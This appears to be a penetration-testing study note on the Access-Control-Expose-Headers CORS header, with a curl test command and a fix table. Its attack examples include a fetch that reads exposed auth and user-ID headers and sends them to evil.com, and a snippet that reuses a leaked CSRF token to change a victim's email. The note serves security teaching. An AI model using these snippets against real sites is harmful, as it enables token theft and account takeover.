---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.45 Access-Control-Expose-Headers — Response Leakage"
---

# 03.45 — Access-Control-Expose-Headers

## What is it?

By default, JavaScript can only read a small set of "simple" response headers from cross-origin responses (even when CORS allows the request). `Access-Control-Expose-Headers` whitelists additional response headers that JavaScript is allowed to read. Exposing sensitive headers leaks internal information.

---

## Default Readable Headers (Always Exposed)

```
These can always be read by JavaScript in CORS responses:
  Cache-Control
  Content-Language
  Content-Length
  Content-Type
  Expires
  Last-Modified
  Pragma
```

---

## Attack: Reading Sensitive Exposed Headers

```
SCENARIO: Server exposes internal headers:
  Access-Control-Expose-Headers: X-Internal-User-ID, X-Session-Token, X-Auth-Token

EXPLOIT from evil.com (if ACAO allows evil.com):
  fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(response => {
    var userId = response.headers.get('X-Internal-User-ID');
    var token = response.headers.get('X-Auth-Token');
    // Send to attacker:
    fetch('https://evil.com/?uid=' + userId + '&tok=' + token);
  })
  
  → Internal user ID and auth tokens leaked cross-origin!
```

---

## Common Sensitive Headers That Shouldn't Be Exposed

```
X-Auth-Token          → authentication token
X-Session-ID          → internal session reference
X-User-ID             → internal user ID
X-Internal-*          → any internal header
X-CSRF-Token          → CSRF protection token (leaking defeats CSRF protection!)
Authorization         → auth credentials in response
X-Powered-By          → tech stack fingerprinting (less critical)
```

---

## CSRF Token Leakage via Exposed Header

```
SPECIAL ATTACK:
  Some apps return CSRF token in a response header:
  X-CSRF-Token: abcdef123456
  
  If this is in Access-Control-Expose-Headers AND ACAO reflects attacker:
  
  Step 1: Cross-origin read to get CSRF token:
    var csrfToken = response.headers.get('X-CSRF-Token');
  
  Step 2: Use token in CSRF attack:
    fetch('/api/change-email', {
      method: 'POST',
      headers: {'X-CSRF-Token': csrfToken},
      credentials: 'include',
      body: JSON.stringify({email: 'attacker@evil.com'})
    })
  
  → CSRF protection bypassed!
```

---

## Testing

```bash
# Check what headers are exposed:
curl -sI https://target.com/api/user \
  -H "Origin: https://evil.com" | grep -i "expose-headers"

# Read specific header from CORS response:
# (Requires browser — use browser DevTools or Burp)
# fetch('https://target.com/api', {credentials:'include'})
# .then(r => { console.log(r.headers.get('X-Internal-ID')); })
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Sensitive headers in Expose-Headers | Only expose headers that are truly needed cross-origin |
| CSRF token exposed | Never expose CSRF tokens in headers readable by other origins |
| Auth tokens exposed | Never expose auth tokens in CORS-readable headers |

---

## Related Notes
- [[41 - Access-Control-Allow-Origin]] — ACAO header
- [[Module 08 - CORS]] — full CORS exploitation
- [[Module 07 - CSRF]] — CSRF token leakage
